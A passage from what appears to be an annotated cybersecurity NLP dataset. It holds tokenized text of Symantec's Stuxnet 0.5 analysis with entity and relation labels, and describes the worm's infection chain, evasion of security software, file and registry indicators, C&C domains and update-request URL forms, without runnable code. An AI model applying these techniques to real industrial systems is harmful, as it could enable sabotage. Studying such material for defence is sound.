"s7blk_findnext", "pos": [11, 12], "sent_id": 130, "type": "SystemConfigurationInformation"}], [{"name": "s7blk_read", "pos": [15, 16], "sent_id": 130, "type": "SystemConfigurationInformation"}], [{"name": "s7blk_read", "pos": [16, 17], "sent_id": 130, "type": "SystemConfigurationInformation"}], [{"name": "SIMATIC 400 Station", "pos": [23, 26], "sent_id": 130, "type": "System"}], [{"name": "SIMATIC H-Station", "pos": [30, 34], "sent_id": 130, "type": "System"}], [{"name": "s7blk_write", "pos": [8, 9], "sent_id": 131, "type": "SystemConfigurationInformation"}], [{"name": "s7blk_write", "pos": [9, 10], "sent_id": 131, "type": "SystemConfigurationInformation"}], [{"name": "s7db_close", "pos": [10, 11], "sent_id": 131, "type": "SystemConfigurationInformation"}], [{"name": "s7db_open", "pos": [11, 12], "sent_id": 131, "type": "SystemConfigurationInformation"}], [{"name": "e", "pos": [12, 13], "sent_id": 131, "type": "SystemConfigurationInformation"}], [{"name": "Stuxnet", "pos": [4, 5], "sent_id": 169, "type": "Malware"}], [{"name": "peripheral I/O values", "pos": [6, 11], "sent_id": 217, "type": "SystemConfigurationInformation"}], [{"name": "pressure reading", "pos": [6, 8], "sent_id": 229, "type": "SystemInformation"}], [{"name": "Stuxnet 0.5", "pos": [1, 3], "sent_id": 252, "type": "Campaign"}], [{"name": "uranium enrichment process", "pos": [12, 15], "sent_id": 256, "type": "ExploitTargetObject"}], [{"name": "Natanz", "pos": [16, 17], "sent_id": 256, "type": "Location"}], [{"name": "Iran", "pos": [18, 19], "sent_id": 256, "type": "Country"}], [{"name": "Natanz", "pos": [12, 13], "sent_id": 259, "type": "Location"}], [{"name": "Stuxnet", "pos": [17, 18], "sent_id": 259, "type": "Malware"}], [{"name": "Stuxnet 0.5", "pos": [4, 6], "sent_id": 261, "type": "Malware"}], [{"name": "Stuxnet", "pos": [13, 14], "sent_id": 261, "type": "MalwareFamily"}], [{"name": "HKEY _ LOCAL _ MACHINE\\SYSTEM\\CurrentControlSet\\Services\\MRxCls", "pos": [10, 15], "sent_id": 265, "type": "Indicator"}], [{"name": "HKEY _ LOCAL _ MACHINE\\SYSTEM\\CurrentControlSet\\Services\\usbacc11", "pos": [0, 5], "sent_id": 266, "type": "Indicator"}], [{"name": "HKEY _ USERS\\<SID>\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ ShellRecoveryState", "pos": [0, 4], "sent_id": 268, "type": "Indicator"}], [{"name": "%WinDir%\\inf\\mdmcpq3.PNF", "pos": [2, 4], "sent_id": 289, "type": "File"}], [{"name": "%WinDir%\\inf\\mdmeric3.PNF", "pos": [7, 9], "sent_id": 289, "type": "File"}], [{"name": "%WinDir%\\inf\\oem6C.PNF", "pos": [13, 15], "sent_id": 289, "type": "File"}], [{"name": "%WinDir%\\inf\\oem7A.PNF", "pos": [18, 20], "sent_id": 289, "type": "File"}], [{"name": "%WinDir%\\inf\\oem7F.pnf", "pos": [27, 29], "sent_id": 289, "type": "File"}], [{"name": "%WinDir%\\inf\\oem7w.pnf", "pos": [29, 31], "sent_id": 289, "type": "File"}], [{"name": "%WinDir%\\inf\\~67.tmp", "pos": [34, 36], "sent_id": 289, "type": "File"}], [{"name": "%System%\\drivers\\mrxcls.sys", "pos": [39, 41], "sent_id": 289, "type": "File"}], [{"name": "%System%\\drivers\\usbacc11.sys", "pos": [45, 47], "sent_id": 289, "type": "File"}], [{"name": "%System%\\drivers\\PCIBUS.SYS", "pos": [55, 57], "sent_id": 289, "type": "File"}], [{"name": "%System%\\comuid.dat", "pos": [63, 65], "sent_id": 289, "type": "File"}], [{"name": "%System%\\netsimp32.dll", "pos": [65, 67], "sent_id": 289, "type": "File"}], [{"name": "%System%\\inetpsp.dll", "pos": [70, 72], "sent_id": 289, "type": "File"}], [{"name": "%System%\\perfg009.dat", "pos": [76, 78], "sent_id": 289, "type": "File"}], [{"name": "%System%\\complnd.dll", "pos": [1, 3], "sent_id": 291, "type": "File"}], [{"name": "%System%\\dllcache\\datacprs.dll", "pos": [3, 5], "sent_id": 291, "type": "File"}], [{"name": "%System%\\wbem\\perfnws.dll", "pos": [5, 7], "sent_id": 291, "type": "File"}], [{"name": "%System%\\dssbase.dat", "pos": [0, 2], "sent_id": 293, "type": "File"}], [{"name": "%AllUsersProfile%\\Application Data\\Microsoft\\HTML Help\\hhorcslt.dat", "pos": [5, 9], "sent_id": 293, "type": "File"}], [{"name": "%Temp%/DF419a.tmp", "pos": [9, 11], "sent_id": 293, "type": "File"}], [{"name": "%WinDir%\\help\\winmic.fts", "pos": [11, 13], "sent_id": 293, "type": "File"}], [{"name": "Tiny Personal Firewall", "pos": [67, 70], "sent_id": 297, "type": "Software"}], [{"name": "Tiny Personal Firewall", "pos": [67, 70], "sent_id": 297, "type": "Software"}], [{"name": "Tiny Personal Firewall", "pos": [67, 70], "sent_id": 297, "type": "Software"}], [{"name": "Tiny Personal Firewall", "pos": [67, 70], "sent_id": 297, "type": "Software"}], [{"name": "Tiny Personal Firewall", "pos": [67, 70], "sent_id": 297, "type": "Software"}], [{"name": "Tiny Personal Firewall", "pos": [67, 70], "sent_id": 297, "type": "Software"}], [{"name": "Tiny Personal Firewall", "pos": [67, 70], "sent_id": 297, "type": "Software"}], [{"name": "Tiny Personal Firewall", "pos": [67, 70], "sent_id": 297, "type": "Software"}], [{"name": "Tiny Activity Monitor", "pos": [82, 85], "sent_id": 297, "type": "Software"}], [{"name": "ZoneAlarm Personal Firewall", "pos": [12, 15], "sent_id": 299, "type": "Software"}], [{"name": "ZoneAlarm Personal Firewall", "pos": [12, 15], "sent_id": 299, "type": "Software"}], [{"name": "ZoneAlarm Personal Firewall", "pos": [12, 15], "sent_id": 299, "type": "Software"}], [{"name": "TDS3 Trojan Defense Suite", "pos": [25, 29], "sent_id": 299, "type": "Software"}], [{"name": "Kaspersky", "pos": [31, 32], "sent_id": 299, "type": "Software"}], [{"name": "Kaspersky", "pos": [31, 32], "sent_id": 299, "type": "Software"}], [{"name": "Kaspersky", "pos": [31, 32], "sent_id": 299, "type": "Software"}], [{"name": "Kaspersky", "pos": [31, 32], "sent_id": 299, "type": "Software"}], [{"name": "Kaspersky", "pos": [31, 32], "sent_id": 299, "type": "Software"}], [{"name": "SafenSoft", "pos": [46, 47], "sent_id": 299, "type": "Software"}], [{"name": "SafenSoft", "pos": [46, 47], "sent_id": 299, "type": "Software"}], [{"name": "Sysinternals Filemon", "pos": [52, 54], "sent_id": 299, "type": "Software"}], [{"name": "Sysinternals Filemon", "pos": [52, 54], "sent_id": 299, "type": "Software"}], [{"name": "McAfee", "pos": [2, 3], "sent_id": 300, "type": "Software"}], [{"name": "McAfee", "pos": [2, 3], "sent_id": 300, "type": "Software"}], [{"name": "McAfee", "pos": [2, 3], "sent_id": 300, "type": "Software"}], [{"name": "McAfee", "pos": [2, 3], "sent_id": 300, "type": "Software"}], [{"name": "Blackice Firewall", "pos": [14, 16], "sent_id": 300, "type": "Software"}], [{"name": "Blackice Firewall", "pos": [14, 16], "sent_id": 300, "type": "Software"}], [{"name": "Blackice Firewall", "pos": [14, 16], "sent_id": 300, "type": "Software"}], [{"name": "rcfgsvc.exe", "pos": [24, 25], "sent_id": 300, "type": "Software"}], [{"name": "Kerio Personal Firewall", "pos": [37, 40], "sent_id": 300, "type": "Software"}], [{"name": "Kerio Personal Firewall", "pos": [37, 40], "sent_id": 300, "type": "Software"}], [{"name": "Kerio Personal Firewall", "pos": [37, 40], "sent_id": 300, "type": "Software"}], [{"name": "Windows Defender", "pos": [52, 54], "sent_id": 300, "type": "Software"}], [{"name": "Windows Defender", "pos": [52, 54], "sent_id": 300, "type": "Software"}], [{"name": "F-Secure", "pos": [60, 63], "sent_id": 300, "type": "Software"}], [{"name": "F-Secure", "pos": [60, 63], "sent_id": 300, "type": "Software"}], [{"name": "F-Secure", "pos": [60, 63], "sent_id": 300, "type": "Software"}], [{"name": "F-Secure", "pos": [60, 63], "sent_id": 300, "type": "Software"}], [{"name": "F-Secure", "pos": [60, 63], "sent_id": 300, "type": "Software"}], [{"name": "F-Secure", "pos": [60, 63], "sent_id": 300, "type": "Software"}], [{"name": "F-Secure", "pos": [60, 63], "sent_id": 300, "type": "Software"}], [{"name": "F-Secure", "pos": [60, 63], "sent_id": 300, "type": "Software"}], [{"name": "F-Secure", "pos": [60, 63], "sent_id": 300, "type": "Software"}], [{"name": "F-Secure", "pos": [60, 63], "sent_id": 300, "type": "Software"}]], "labels": [{"r": "P33", "h": 20, "t": 22, "evidence": [24, 26]}, {"r": "P33", "h": 20, "t": 23, "evidence": [24, 27]}, {"r": "P33", "h": 20, "t": 24, "evidence": [24, 27]}, {"r": "P33", "h": 20, "t": 25, "evidence": [24, 28]}, {"r": "P7", "h": 42, "t": 41, "evidence": [35]}, {"r": "P7", "h": 42, "t": 40, "evidence": [35]}, {"r": "P7", "h": 42, "t": 39, "evidence": [34, 35]}, {"r": "P7", "h": 42, "t": 38, "evidence": [34, 35]}, {"r": "P7", "h": 42, "t": 37, "evidence": [34, 35]}, {"r": "P7", "h": 33, "t": 34, "evidence": [30, 31]}, {"r": "P7", "h": 33, "t": 35, "evidence": [30, 32]}, {"r": "P7", "h": 33, "t": 36, "evidence": [30, 32]}, {"r": "P16", "h": 43, "t": 44, "evidence": [35, 36]}, {"r": "P21", "h": 54, "t": 53, "evidence": [48]}, {"r": "P21", "h": 55, "t": 53, "evidence": [48]}, {"r": "P7", "h": 53, "t": 56, "evidence": [48, 49]}, {"r": "P29", "h": 53, "t": 57, "evidence": [48, 49]}, {"r": "P21", "h": 58, "t": 59, "evidence": [49]}, {"r": "P21", "h": 62, "t": 60, "evidence": [51, 52]}, {"r": "P21", "h": 61, "t": 60, "evidence": [51, 52]}, {"r": "P21", "h": 63, "t": 60, "evidence": [51, 53]}, {"r": "P21", "h": 64, "t": 60, "evidence": [51, 53]}, {"r": "P21", "h": 65, "t": 66, "evidence": [54]}, {"r": "P21", "h": 67, "t": 66, "evidence": [54, 58]}, {"r": "P21", "h": 68, "t": 66, "evidence": [54, 59]}, {"r": "P27", "h": 136, "t": 137, "evidence": [252, 256]}, {"r": "P16", "h": 143, "t": 142, "evidence": [261]}, {"r": "P21", "h": 144, "t": 141, "evidence": [259, 265]}, {"r": "P21", "h": 145, "t": 141, "evidence": [259, 266]}, {"r": "P21", "h": 146, "t": 141, "evidence": [259, 268]}, {"r": "P21", "h": 147, "t": 141, "evidence": [259, 289]}, {"r": "P21", "h": 148, "t": 141, "evidence": [259, 289]}, {"r": "P21", "h": 149, "t": 141, "evidence": [259, 289]}, {"r": "P21", "h": 150, "t": 141, "evidence": [259, 289]}, {"r": "P21", "h": 151, "t": 141, "evidence": [259, 289]}, {"r": "P21", "h": 152, "t": 141, "evidence": [259, 289]}, {"r": "P21", "h": 153, "t": 141, "evidence": [259, 289]}, {"r": "P21", "h": 154, "t": 141, "evidence": [259, 289]}, {"r": "P21", "h": 155, "t": 141, "evidence": [259, 289]}, {"r": "P21", "h": 156, "t": 141, "evidence": [259, 289]}, {"r": "P21", "h": 157, "t": 141, "evidence": [259, 289]}, {"r": "P21", "h": 158, "t": 141, "evidence": [259, 289]}, {"r": "P21", "h": 159, "t": 141, "evidence": [259, 289]}, {"r": "P21", "h": 160, "t": 141, "evidence": [259, 289]}, {"r": "P21", "h": 95, "t": 141, "evidence": [110, 259]}, {"r": "P21", "h": 97, "t": 141, "evidence": [110, 259]}, {"r": "P21", "h": 161, "t": 141, "evidence": [259, 291]}, {"r": "P21", "h": 162, "t": 141, "evidence": [259, 291]}, {"r": "P21", "h": 163, "t": 141, "evidence": [259, 291]}, {"r": "P21", "h": 102, "t": 141, "evidence": [110, 259]}, {"r": "P21", "h": 164, "t": 141, "evidence": [259, 293]}, {"r": "P21", "h": 165, "t": 141, "evidence": [259, 293]}, {"r": "P21", "h": 166, "t": 141, "evidence": [259, 293]}, {"r": "P21", "h": 167, "t": 141, "evidence": [259, 293]}], "title": "201302SymantecStuxnet", "sents": [["Security", "Response", "Stuxnet", "0.5", ":"], ["The", "Missing", "Link", "Geoff", "McDonald", ",", "Liam", "O", "Murchu", ",", "Stephen", "Doherty", ",", "Eric", "Chien", "Version", "1.0", ":", "February", "26", ",", "2013", "Contents", "Overview", ".............................................................", "1", "Installation", "and", "load", "point", "................................."], ["3", "Replication", "..........................................................", "3"], ["Command", "-", "and", "-", "control", ".......................................", "4", "Payload", "................................................................", "5"], ["Man", "-", "in", "-", "the", "-", "Middle", "........................................", "5"], ["Fingerprinting", "and", "building", "DB8061", ".................", "6", "PLC", "device", "attack", "code", ".................................", "9", "Conclusion", "........................................................"], ["12", "Appendix", "A", "........................................................", "13", "Appendix", "B", "........................................................", "14", "Appendix", "C", "........................................................", "15", "Appendix", "D", "........................................................"], ["16", "Resources", "...........................................................", "17"], ["Community", "credits", "............................................"], ["17", "Overview"], ["In", "2010", ",", "Symantec", "reported", "on", "a", "new", "and", "highly", "sophisticated", "worm", "called", "Stuxnet", "."], ["This", "worm", "became", "known", "as", "the", "first", "computer", "software", "threat", "that", "was", "used", "as", "a", "cyber", "-", "weapon", "."], ["The", "worm", "was", "specifically", "designed", "to", "take", "control", "over", "industrial", "plant", "machinery", "and", "making", "them", "operate", "outside", "of", "their", "safe", "or", "normal", "performance", "envelope", ",", "causing", "damage", "in", "the", "process", "."], ["This", "was", "a", "first", "in", "the", "history", "of", "malware", "."], ["Clues", "in", "the", "code", "pointed", "to", "other", "versions", "of", "the", "worm", "which", "could", "potentially", "perform", "different", "actions", "leaving", "an", "open", "question", "about", "Stuxnet", "and", "how", "it", "came", "to", "be", "."], ["The", "wait", "for", "the", "missing", "link", "is", "now", "over", "."], ["Symantec", "have", "now", "discovered", "an", "older", "version", "of", "Stuxnet", "that", "can", "answer", "the", "questions", "about", "the", "evolution", "of", "Stuxnet", "."], ["This", "newly", "discovered", "variant", "has", "been", "dissected", "and", "analyzed", "in", "detail", "and", "here", "is", "a", "summary", "of", "our", "key", "findings", ":", "\u2022", "Stuxnet", "0.5", "is", "the", "oldest", "known", "Stuxnet", "version", "to", "be", "analyzed", ",", "in", "the", "wild", "as", "early", "as", "November", "2007", "and", "in", "development", "as", "early", "as", "November", "2005", "."], ["\u2022"], ["Stuxnet", "0.5", "was", "less", "aggressive", "than", "Stuxnet", "versions", "1.x", "and", "only", "spread", "through", "infected", "Step", "7", "projects", "."], ["\u2022"], ["Stuxnet", "0.5", "contains", "an", "alternative", "attack", "strategy", ",", "closing", "valves", "within", "the", "uranium", "enrichment", "facility", "at", "Natanz", ",", "Iran", ",", "which", "would", "have", "caused", "serious", "damage", "to", "the", "centrifuges", "and", "uranium", "enrichment", "system", "as", "a", "whole", "."], ["Stuxnet", "0.5", ":", "The", "Missing", "Link", "Security", "Response", "Whether", "Stuxnet", "0.5", "was", "successful", "is", "unclear", ",", "but", "later", "versions", "of", "Stuxnet", "were", "developed", "using", "a", "different", "development", "framework", ",", "became", "more", "aggressive", ",", "and", "employed", "a", "different", "attack", "strategy", "that", "changed", "the", "speeds", "of", "the", "centrifuges", "instead", "instead", "suggesting", "Stuxnet", "0.5", "did", "not", "completely", "fulfill", "the", "attacker", "\u2019s", "goals", "."], ["More", "versions", "of", "Stuxnet", "are", "known", "to", "exist", ",", "but", "have", "never", "been", "recovered", "."], ["Evolution", "Table", "1", "Evolution", "of", "Stuxnet", "versions", "Stuxnet", "0.5"], ["was", "submitted", "to", "Version", "a", "malware", "scanning", "service", "in", "November", "2007", "and", "could", "have", "0.500", "began", "operation", "as", "early", "as", "0.500"], ["November", "2005", "."], ["This", "version", "is", "0.500", "designed", "to", "stop", "compromising", "computers", "on", "July", "4", ",", "2009", ",", "and", "1.001", "stop", "communicating", "with", "its", "1.100", "command", "-", "and", "-", "control", "(", "C&C", ")", "1.101", "servers", "on", "an", "earlier", "date", "of", "1.x", "January", "11", "that", "same", "year", "."], ["The", "compile", "timestamps", "found", "within", "most", "of", "the", "code", "appear", "unreliable", "and", "generally", "are", "in", "the", "range", "of", "the", "year", "2001", "."], ["Date", "Description", "November", "3", ",", "2005", "C&C", "server", "registration", "November", "15", ",", "2007"], ["Submit", "date", "to", "a", "public", "scanning", "service", "July", "4", ",", "2009", "Infection", "stop", "date", "June", "22", ",", "2009", "Main", "binary", "compile", "timestamp", "March", "1", ",", "2010", "Main", "binary", "compile", "timestamp", "April", "14", ",", "2010", "Main", "binary", "compile", "timestamp", "June", "24", ",", "2012", "Infection", "stop", "date", "Table", "2", "Evolution", "of", "Stuxnet", "exploits"], ["Vulnerability", "0.500", "1.001", "1.100", "1.101", "X", "CVE-2010", "-", "3888", "X", "Description"], ["Task", "scheduler", "EOP", "X", "X", "LoadKeyboardLayout", "EOP", "CVE-2010", "-", "2729", "X", "X", "X", "Print", "spooler", "RCE", "CVE-2008", "-", "4250", "X", "X", "X", "Windows", "Server", "Service", "RPC", "RCE", "X", "X", "X", "Step", "7"], ["Insecure", "Library", "Loading", "X", "X", "X", "WinCC", "default", "password", "X", "X", "Shortcut", ".lnk"], ["RCE", "CVE-2010", "-", "2743", "CVE-2012", "-", "3015", "X", "CVE-2010", "-", "2772"], ["CVE-2010", "-", "2568", "MS09", "-", "025", "X", "Based", "on", "an", "internal", "version", "number", "this", "version", "of", "Stuxnet", "is", "0.5", ",", "the", "earliest", "known", "version", "of", "the", "Stuxnet", "family", "."], ["The", "only", "method", "of", "replication", "in", "Stuxnet", "0.5", "is", "through", "infection", "of", "Siemens", "Step", "7", "project", "files", "."], ["Stuxnet", "0.5", "does", "not", "exploit", "any", "Microsoft", "vulnerabilities", ",", "unlike", "versions", "1.x", "which", "came", "later", "."], ["There", "are", "differences", "in", "exploited", "vulnerabilities", "and", "spreading", "mechanisms", "between", "Stuxnet", "versions", "."], ["NtUserRegisterClassExWow", "/", "NtUserMessageCall", "EOP", "Table", "3", "Evolution", "of", "Stuxnet", "replication"], ["Replication", "Technique", "0.500", "1.001", "1.100", "1.101"], ["Step", "7", "project", "files", "X", "USB", "through", "Step", "7", "project", "files", "X", "X", "X", "X", "X", "X", "X", "USB", "through", "Autorun", "USB", "through", "CVE-2010", "-", "2568"], ["Network", "shares", "X", "X", "X", "Windows", "Server", "RPC", "X", "X", "X", "Printer", "spooler", "X", "X", "X", "WinCC", "servers", "X", "X", "X", "X", "X", "X", "Peer", "-", "to", "-", "peer", "updating", "through", "mailslots"], ["Peer", "-", "to", "-", "peer", "updating", "through", "RPC", "X", "Page", "2", "Stuxnet", "0.5", ":", "The", "Missing", "Link", "Security", "Response", "Stuxnet", "0.5", "is", "partly", "based", "on", "the", "Flamer", "platform", "whereas", "1.x", "versions", "were", "based", "primarily", "on", "the", "Tilded", "platform", "."], ["Over", "time", ",", "the", "developers", "appear", "to", "have", "migrated", "more", "towards", "the", "Tilded", "platform", "."], ["The", "developers", "actually", "re", "-", "implemented", "Flamer", "-", "platform", "components", "using", "the", "Tilded", "platform", "in", "later", "versions", "."], ["Both", "the", "Flamer", "and", "Tilded", "platform", "code", "bases", "are", "different", "enough", "to", "suggest", "different", "developers", "were", "involved", "."], ["Stuxnet", "0.5", "also", "contains", "code", "to", "attack", "the", "valve", "systems", "in", "a", "uranium", "enrichment", "facility", "rather", "than", "modifying", "centrifuge", "speeds", ",", "as", "in", "versions", "1.x", "of", "Stuxnet", "."], ["Installation", "and", "load", "point", "Stuxnet", "0.5", "arrives", "as", "an", "infected", "Step", "7", "project", "archive", "containing", "both", "the", "s7hkimdb.dll", "and", "XR000001.MDX", "files", "."], ["Using", "the", "Multiple", "Siemens", "SIMATIC", "Products", "DLL", "Loading", "Arbitrary", "Code", "Execution", "Vulnerability", "(", "CVE2012", "-", "3015", ")", ",", "the", "S7hkimdb.dll", "file", "is", "executed", ",", "which", "then", "decrypts", "and", "injects", "the", "main", "XR00001.MDX", "Stuxnet", "binary", "file", "into", "the", "services.exe", "process", "."], ["Stuxnet", "is", "now", "executing", "on", "the", "system", "."], ["Once", "injected", "into", "the", "services.exe", "process", ",", "a", "copy", "of", "the", "main", "Stuxnet", "binary", "and", "a", "companion", "DLL", "that", "implements", "the", "payload", "are", "saved", "to", "disk", "in", "encrypted", "form", "along", "with", "a", "MRXCLS.SYS", "load", "point", "driver", "."], ["The", "main", "Stuxnet", "binary", "refers", "to", "itself", "as", "outbreak.dll", "and", "is", "saved", "to", "disk", "as", "oem7a.pnf", "."], ["The", "companion", "DLL", "that", "implements", "the", "payload", "refers", "to", "itself", "as", "installation.dll", "and", "saved", "to", "disk", "as", "oem7w.pnf", "."], ["When", "the", "system", "is", "booted", ",", "the", "MRXCLS.SYS", "load", "point", "driver", "will", "decrypt", "configuration", "data", "stored", "in", "the", "registry", ",", "decrypt", "the", "main", "Stuxnet", "binary", ",", "and", "inject", "it", "into", "the", "Explorer", "and", "Step", "7", "processes", "."], ["The", "payload", "DLL", "will", "be", "decrypted", "as", "well", "and", "injected", "into", "the", "Explorer", "process", "."], ["When", "loading", "dynamic", "-", "link", "library", "(", "DLL", ")", "resources", ",", "Stuxnet", "makes", "use", "of", "a", "module", "that", "mimics", "LoadLibrary", "rather", "than", "calling", "LoadLibrary", "itself", "."], ["This", "technique", "is", "likely", "used", "to", "avoid", "security", "software", "and", "was", "not", "seen", "in", "versions", "1.x", "of", "Stuxnet", "."], ["A", "second", "driver", ",", "PCIBUS.SYS", ",", "is", "also", "created", "which", "causes", "a", "forced", "reboot", "by", "generating", "a", "BSoD", "(", "Blue", "Screen", "of", "Death", ")", "20", "days", "after", "installation", "."], ["A", "third", "driver", ",", "USBACC11.SYS", ",", "is", "then", "installed", "."], ["This", "driver", "is", "similar", "to", "the", "MRXCLS.SYS", "driver", ",", "but", "instead", "decrypts", "and", "injects", "DLLs", "for", "peer", "-", "to", "-", "peer", "and", "C&C", "communication", "into", "the", "svchost.exe", "and", "Internet", "Explorer", "processes", "."], ["The", "structure", "and", "organization", "as", "well", "as", "resource", "and", "export", "listings", "of", "each", "component", "is", "available", "in", "Appendix", "D.", "Stuxnet", "0.5", "also", "checks", "the", "current", "date", "in", "a", "variety", "of", "code", "paths", "and", "will", "not", "continue", "to", "spread", "after", "July", "4", ",", "2009", "."], ["Certain", "modules", "may", "also", "not", "be", "created", "or", "loaded", "if", "security", "software", "is", "present", "."], ["A", "list", "is", "available", "in", "Appendix", "B."], ["A", "variety", "of", "additional", "files", "are", "created", ",", "including", "log", "files", "and", "configuration", "files", "."], ["A", "list", "is", "available", "in", "Appendix", "A.", "Replication"], ["Stuxnet", "0.5", "uses", "one", "form", "of", "replication", "through", "Step", "7", "project", "archives", "."], ["When", "a", "removable", "drive", "is", "inserted", "in", "an", "infected", "system", ",", "Stuxnet", "0.5", "will", "infect", "any", "Step", "7", "project", "archives", "with", "a", ".s7p", "or", ".zip", "file", "name", "extension", "on", "the", "drive", "."], ["In", "addition", ",", "Step", "7", "project", "archives", "on", "the", "local", "disk", "will", "also", "be", "infected", "."], ["Therefore", "Stuxnet", "0.5", "spreads", "to", "additional", "machines", "through", "removable", "drives", "or", "through", "human", "-", "initiated", "sharing", "of", "infected", "Step", "7", "project", "archives", ",", "for", "example", "through", "email", "."], ["Stuxnet", "0.5", "infects", "Step", "7", "project", "archives", "in", "the", "same", "manner", "as", "Stuxnet", "1.x", "versions", "(", "as", "described", "in", "W32", "."], ["Page", "3", "Stuxnet", "0.5", ":", "The", "Missing", "Link", "Security", "Response", "Stuxnet", "Dossier", ",", "Step", "7", "Project", "File", "Infections", ")", "."], ["The", "following", "is", "an", "example", "file", "listing", "of", "an", "infected", "Step", "7", "project", "file", "."], ["ApiLog", "/", "Types", "\u2013", "modified", "to", "trigger", "DLL", "loading", "vulnerability"], ["XUTILS", "/", "links", "/", "S7P00001.DBF", "\u2013", "configuration", "file"], ["XUTILS", "/", "listen", "/", "S7000001.MDX", "\u2013", "payload", "DLL", "(", "installation.dll", ")"], ["XUTILS", "/", "listen", "/", "XR000000.MDX", "\u2013", "main", "Stuxnet", "binary", "(", "outbreak.dll", ")", "hOmSave7", "/", "subfolder", "/", "s7hkimdb.dll", "-", "loader", "Command", "-", "and", "-", "control"], ["Similar", "to", "Stuxnet", "1.x", "versions", ",", "Stuxnet", "0.5", "has", "limited", "command", "-", "and", "-", "control", "ability", "."], ["In", "particular", ",", "Stuxnet", "0.5", "does", "not", "provide", "fine", "grained", "control", "to", "its", "authors", "."], ["Instead", ",", "Stuxnet", "0.5", "can", "only", "download", "new", "code", "and", "update", "itself", "."], ["Stuxnet", "needs", "to", "ultimately", "spread", "on", "isolated", "networks", "with", "no", "Internet", "access", ",", "therefore", "it", "has", "been", "designed", "to", "be", "autonomous", "to", "reduce", "the", "need", "for", "robust", "and", "fine", "grained", "command", "-", "and", "-", "control", "."], ["Stuxnet", "0.5", "also", "uses", "a", "secondary", "peer", "-", "to", "-", "peer", "mechanism", "to", "propagate", "these", "code", "updates", "to", "peers", "on", "networks", "inaccessible", "to", "the", "broader", "Internet", "."], ["Command", "-", "and", "-", "control", "is", "implemented", "by", "the", "inetpsp.dll", "file", "while", "peer", "-", "to", "-", "peer", "communications", "are", "implemented", "by", "the", "netsimp32.dll", "file", "."], ["Both", "files", "are", "loaded", "by", "the", "usbacc11.sys", "driver", "and", "then", "injected", "into", "the", "svchost.exe", "and", "iexplore.exe", "processes", "."], ["Stuxnet", "0.5", "has", "four", "C&C", "servers", ",", "all", "of", "which", "are", "now", "either", "unavailable", "or", "have", "since", "been", "registered", "by", "an", "unrelated", "party", ":"], ["\u2022", "\u2022", "\u2022", "\u2022", "smartclick.org", "best-advertising.net", "internetadvertising4u.com", "ad-marketing.net", "Interestingly", ",", "Stuxnet", "0.5", "is", "programmed", "to", "stop", "contacting", "the", "C&C", "server", "after", "January", "11", ",", "2009", ",", "even", "though", "the", "threat", "is", "programmed", "to", "only", "stop", "spreading", "after", "a", "later", "date", "of", "July", "4", ",", "2009", "."], ["The", "C&C", "server", "domains", "were", "created", "in", "2005", "and", "all", "displayed", "the", "same", "front", "page", "purporting", "to", "be", "an", "Internet", "advertising", "agency", "named", "Media", "Suffix"], ["(", "figure", "1", ")", "with", "the", "tag", "line"], ["\u201c", "Believe", "What", "the", "Mind", "Can", "Dream", "\u201d", "."], ["Figure", "1", "Internet", "advertising", "agency", "homepage", "for", "Stuxnet", "C&C", "servers"], ["The", "servers", "were", "hosted", "on", "commercial", "hosting", "providers", "in", "the", "United", "States", ",", "Canada", ",", "France", ",", "and", "Thailand", "."], ["The", "fact", "that", "these", "domains", "were", "in", "operation", "since", "2005", ",", "suggests", "that", "the", "Stuxnet", "project", "started", "more", "than", "seven", "years", "ago", "."], ["Page", "4", "Stuxnet", "0.5", ":", "The", "Missing", "Link", "Security", "Response", "The", "first", "request", "by", "Stuxnet", "0.5", "uses", "the", "following", "form", ":", "http://<domain>/cgi", "/", "link.php?site", "=", "xx"], ["This", "notifies", "the", "C&C", "server", "of", "an", "active", "successful", "infection", "."], ["Next", ",", "Stuxnet", "0.5", "sends", "the", "following", "request", ":", "http://<domain>/cgi", "/", "click.php?xite", "="], ["xx&num", "=", "yy&c=1&j=%x&k=%x&l=%x"], ["This", "may", "download", "and", "execute", "a", "file", "if", "an", "update", "is", "available", "."], ["The", "final", "target", "network", "for", "Stuxnet", "0.5", "was", "likely", "isolated", "from", "the", "Internet", "."], ["To", "allow", "updates", "to", "reach", "these", "machines", ",", "Stuxnet", "0.5", "also", "used", "a", "peer", "-", "to", "-", "peer", "mechanism", "."], ["As", "long", "as", "one", "updated", "version", "was", "introduced", "into", "this", "network", "\u2014", "for", "example", "through", "an", "infected", "USB", "key", "\u2014", "all", "the", "other", "infected", "machines", "on", "the", "network", "could", "receive", "updates", "or", "new", "code", "modules", "."], ["Stuxnet", "0.5", "uses", "Windows", "mailslots", "for", "peer", "-", "to", "-", "peer", "communication", "."], ["Mailslots", "allow", "a", "process", "to", "pass", "a", "message", "to", "another", "process", "on", "a", "remote", "machine", "."], ["Stuxnet", "0.5", "enumerates", "all", "machines", "on", "the", "network", "and", "attempts", "to", "connect", "to", "a", "mailslot", "named", "\\\\[REMOTE", "MACHINE"], ["NAME]\\mailslot\\svchost", "."], ["It", "then", "provides", "a", "callback", "mailslot", "name", "of", "\\\\[LOCAL", "MACHINE", "NAME]\\mailslot\\imnotify", "."], ["Stuxnet", "0.5", "uses", "these", "mailslots", "for", "peer", "-", "to", "-", "peer", "communication", "and", "to", "pass", "code", "updates", "."], ["In", "addition", ",", "Stuxnet", "0.5", "may", "configure", "systems", "to", "allow", "anonymous", "logins", "and", "then", "provides", "the", "following", "file", "shares", ":"], ["\u2022", "\u2022", "\u2022", "\u2022", "temp$", "msagent$", "SYSADMIN$"], ["WebFiles$"], ["This", "allows", "file", "retrieval", "by", "peer", "infections", "."], ["Shared", "files", "include", ":", "%", "WinDir%\\msagent\\agentsb.dll", "%", "WinDir%\\msagent\\intl\\agt0f2e.dll", "%", "WinDir%\\system32\\complnd.dll", "%", "WinDir%\\system32\\dllcache\\datacprs.dll", "%", "WinDir%\\system32\\wbem\\perfnws.dll", "%", "WinDir%\\Installer\\{6F716D8C-398F-11D3", "-", "85E1", "-", "005004838609}\\places.dat", "Payload", "Man", "-", "in", "-", "the", "-", "Middle"], ["In", "order", "to", "both", "fingerprint", "the", "target", "system", "and", "inject", "malicious", "Programmable", "Logic", "Controller", "(", "PLC", ")", "code", ",", "Stuxnet", "0.5", "replaces", "two", "Step", "7", "DLLs", "in", "order", "to", "hijack", "communications", "with", "a", "PLC", "."], ["The", "first", "DLL", ",", "s7otbxdx.dll", ",", "is", "hijacked", "in", "order", "to", "insert", "the", "malicious", "PLC", "code", "."], ["The", "same", "technique", "was", "used", "in", "Stuxnet", "versions", "1.x"], ["(", "as", "described", "in", 